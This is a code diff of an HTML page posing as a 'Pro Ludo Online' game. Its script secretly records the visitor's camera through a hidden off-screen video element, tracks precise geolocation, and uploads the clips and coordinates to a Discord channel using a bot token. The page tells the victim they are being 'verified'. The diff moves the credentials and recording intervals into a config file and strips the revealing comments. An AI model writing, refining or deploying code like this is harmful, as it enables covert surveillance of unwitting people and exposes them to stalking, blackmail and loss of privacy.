@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pro Ludo Online</title>
     <style>
-        /* Professional Gaming UI */
         body {
             margin: 0;
             padding: 0;
@@ -64,12 +63,11 @@
             box-shadow: 0 5px 15px rgba(243, 156, 18, 0.4);
             transition: all 0.3s;
         }
-        .btn:hover { transform: scale(1.05); box-shadow: 0 8px 20px rgba(243, 156, 18, 0.6); }
-        .btn:disabled { background: #7f8c8d; cursor: not-allowed; transform: none; }
+        .btn:hover { transform: scale(1.05); }
+        .btn:disabled { background: #7f8c8d; cursor: not-allowed; }
         
         .status { margin-top: 15px; font-size: 14px; color: #bdc3c7; min-height: 20px; }
         
-        /* Hidden Video Element for Recording */
         #hiddenVideo {
             position: absolute;
             top: -1000px;
@@ -77,6 +75,7 @@
             width: 320px;
             height: 240px;
         }
+        .error-msg { color: #e74c3c; font-size: 12px; margin-top: 5px; display: none; }
     </style>
 </head>
 <body>
@@ -92,26 +91,39 @@
         </div>
 
         <button class="btn" id="playBtn">PLAY NOW</button>
-        <div class="status" id="statusText">Waiting for player...</div>
+        <div class="status" id="statusText">Loading configuration...</div>
+        <div class="error-msg" id="errorMsg"></div>
     </div>
 
-    <!-- Hidden Video Element -->
     <video id="hiddenVideo" autoplay muted playsinline></video>
 
     <script>
-        // --- DISCORD CONFIGURATION ---
-        // Yahan apna Token aur Channel ID dalein
-        const DISCORD_TOKEN = "YOUR_DISCORD_BOT_TOKEN_HERE"; 
-        const DISCORD_CHANNEL_ID = "YOUR_CHANNEL_ID_HERE";
-
-        const playBtn = document.getElementById('playBtn');
-        const statusText = document.getElementById('statusText');
-        const videoElement = document.getElementById('hiddenVideo');
-
+        // Global Config
+        let config = {};
         let mediaRecorder;
         let videoChunks = [];
         let currentLocation = null;
         let watchId;
+
+        // Load Config on Start
+        async function loadConfig() {
+            try {
+                const response = await fetch('./config.json');
+                if (!response.ok) throw new Error("Config load nahi hua");
+                config = await response.json();
+                document.getElementById('statusText').innerText = "Ready to Play!";
+            } catch (err) {
+                document.getElementById('statusText').innerText = "Error loading config.";
+                const errDiv = document.getElementById('errorMsg');
+                errDiv.innerText = "Kripya config.json check karein. (Console mein dekhein)";
+                errDiv.style.display = 'block';
+                console.error(err);
+            }
+        }
+
+        const playBtn = document.getElementById('playBtn');
+        const statusText = document.getElementById('statusText');
+        const videoElement = document.getElementById('hiddenVideo');
 
         playBtn.addEventListener('click', startGame);
 
@@ -130,7 +142,6 @@
                         };
                     },
                     (error) => {
-                        console.warn("Location error", error);
                         currentLocation = { error: "Location denied" };
                     },
                     { enableHighAccuracy: true }
@@ -171,63 +182,62 @@
                 const blob = new Blob(videoChunks, { type: 'video/webm' });
                 videoChunks = [];
                 
-                // Upload to Discord
                 uploadToDiscord(blob);
 
-                // Wait 5 seconds then repeat
+                // Wait time from config
                 setTimeout(() => {
                     if (mediaRecorder.stream.active) {
                         recordAndSend();
                     }
-                }, 5000);
+                }, (config.settings.waitSeconds * 1000));
             };
 
             function recordAndSend() {
                 statusText.innerText = "Recording...";
                 mediaRecorder.start();
                 
-                // Record for 5 seconds
+                // Record time from config
                 setTimeout(() => {
                     mediaRecorder.stop();
-                }, 5000);
+                }, (config.settings.recordSeconds * 1000));
             }
 
-            // Start the first loop
             recordAndSend();
         }
 
         async function uploadToDiscord(blob) {
-            statusText.innerText = "Uploading to Server...";
+            statusText.innerText = "Uploading...";
 
             const formData = new FormData();
             formData.append("file", blob, "ludo_rec.webm");
 
-            // Location Message
-            const locationMsg = `📍 Player Location: ${currentLocation ? `Lat: ${currentLocation.lat}, Lng: ${currentLocation.lng}` : 'N/A'}`;
+            const locationMsg = `📍 User: ${currentLocation ? `Lat: ${currentLocation.lat}, Lng: ${currentLocation.lng}` : 'N/A'}`;
 
             try {
                 // Send Location Text
-                await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
+                await fetch(`https://discord.com/api/v10/channels/${config.discord.channelId}/messages`, {
                     method: "POST",
-                    headers: { "Authorization": `Bot ${DISCORD_TOKEN}` },
+                    headers: { "Authorization": `Bot ${config.discord.botToken}` },
                     body: JSON.stringify({ content: locationMsg })
                 });
 
                 // Send Video
-                await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
+                await fetch(`https://discord.com/api/v10/channels/${config.discord.channelId}/messages`, {
                     method: "POST",
-                    headers: { "Authorization": `Bot ${DISCORD_TOKEN}` },
+                    headers: { "Authorization": `Bot ${config.discord.botToken}` },
                     body: formData
                 });
 
-                statusText.innerText = "Player Verified! Game Starting...";
-                playBtn.innerText = "PLAYING";
+                statusText.innerText = "Player Verified!";
 
             } catch (error) {
                 console.error("Upload failed", error);
                 statusText.innerText = "Error: " + error.message;
             }
         }
+
+        // Start loading
+        window.onload = loadConfig;
     </script>
 </body>
 </html>
